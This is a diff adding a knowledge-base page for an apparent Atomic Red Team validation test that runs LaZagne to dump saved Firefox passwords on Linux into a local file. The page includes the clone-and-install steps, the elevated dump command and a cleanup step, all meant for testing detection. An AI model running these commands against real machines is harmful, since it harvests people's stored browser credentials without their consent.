@@ -1,0 +1,110 @@
+---
+atomic_guid: "87e88698-621b-4c45-8a89-4eaebdeaabb1"
+title: "LaZagne.py - Dump Credentials from Firefox Browser"
+framework: "atomic"
+generated: "true"
+attack_technique_id: "T1555.003"
+attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
+source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
+build_date: "2026-04-26 14:38:40"
+executor: "sh"
+aliases:
+  - "87e88698-621b-4c45-8a89-4eaebdeaabb1"
+  - "LaZagne.py - Dump Credentials from Firefox Browser"
+platforms:
+  - "linux"
+tags:
+  - "atomic"
+  - "validation-test"
+---
+
+[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]
+
+# LaZagne.py - Dump Credentials from Firefox Browser
+
+Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne
+
+## Metadata
+
+- Atomic GUID: 87e88698-621b-4c45-8a89-4eaebdeaabb1
+- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
+- Platforms: linux
+- Executor: sh
+- Elevation Required: True
+- Dependency Executor: sh
+- Source Path: atomics/T1555.003/T1555.003.yaml
+
+## ATT&CK Mapping
+
+- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]
+
+## Input Arguments
+
+### lazagne_path
+
+- description: Path you put LaZagne Github with LaZagne.py
+- type: string
+- default: /tmp/LaZagne/Linux
+
+### output_file
+
+- description: This is where output for the Firefox passwords goes
+- type: string
+- default: /tmp/firefox_password.txt
+
+### specific_module
+
+- description: You may change the module to "all" for all password that can be found by LaZagne.py
+- type: string
+- default: browsers -firefox
+
+## Dependencies
+
+Get Lazagne from Github and install requirements
+
+### Prerequisite Check
+
+```text
+test -f #{lazagne_path}/laZagne.py
+```
+
+### Get Prerequisite
+
+```text
+cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
+```
+
+Needs git, python3 and some pip stuff
+
+### Prerequisite Check
+
+```text
+which git && which python3 && which pip
+```
+
+### Get Prerequisite
+
+```text
+apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
+```
+
+## Executor
+
+- elevation_required: True
+- name: sh
+
+### Command
+
+```sh
+python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}
+```
+
+### Cleanup
+
+```sh
+rm -R /tmp/LaZagne; rm -f #{output_file}
+```
+
+## Source
+
+- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
